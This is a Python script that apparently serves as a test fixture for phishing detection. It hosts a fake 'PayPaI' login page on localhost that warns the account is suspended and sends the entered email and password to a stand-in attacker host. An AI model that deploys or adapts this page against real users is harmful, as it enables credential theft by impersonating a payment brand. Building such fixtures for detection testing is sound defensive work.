import http.server
import socketserver

PORT = 8088
socketserver.TCPServer.allow_reuse_address = True

HTML_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PayPaI - Secure Verification Login</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f172a;
      color: #f8fafc;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #1e293b;
      border: 1px solid #334155;
      padding: 36px;
      border-radius: 16px;
      width: 360px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
    }
    .brand {
      color: #3b82f6;
      font-size: 24px;
      font-weight: 900;
      text-align: center;
      margin-bottom: 8px;
    }
    .warning-text {
      color: #ef4444;
      font-size: 11px;
      text-align: center;
      margin-bottom: 24px;
      font-weight: bold;
    }
    label {
      font-size: 12px;
      color: #94a3b8;
      display: block;
      margin-bottom: 6px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border-radius: 8px;
      border: 1px solid #475569;
      background: #0f172a;
      color: #ffffff;
      box-sizing: border-box;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #ef4444;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: 800;
      font-size: 14px;
      cursor: pointer;
      box-shadow: 0 4px 14px rgba(239, 68, 68, 0.4);
    }
    button:hover { background: #dc2626; }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="brand">PayPaI Secure Auth</div>
    <div class="warning-text">⚠️ ACCOUNT SUSPENDED: VERIFY PASSWORD TO RESTORE ACCESS</div>
    
    <!-- MISMATCHED ORIGIN FORM TARGET: Submits credentials to attacker C2 server -->
    <form action="http://exfiltrate-stolen-credentials.attacker-c2.net/steal" method="POST">
      <label>Account Email / Phone</label>
      <input type="email" placeholder="user@paypal-verify.com" required>
      
      <label>Password</label>
      <input type="password" placeholder="••••••••••••" required>
      
      <button type="submit">Verify & Log In</button>
    </form>
  </div>
</body>
</html>
"""

class TestPhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_CONTENT.encode('utf-8'))

import threading

class DualTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

def serve_on_port(port):
    try:
        with DualTCPServer(("", port), TestPhishingHandler) as httpd:
            print(f"Test Phishing Portal running on http://localhost:{port}/login")
            httpd.serve_forever()
    except Exception as e:
        print(f"Could not bind on port {port}: {e}")

if __name__ == '__main__':
    t1 = threading.Thread(target=serve_on_port, args=(8088,), daemon=True)
    t1.start()
    serve_on_port(8080)
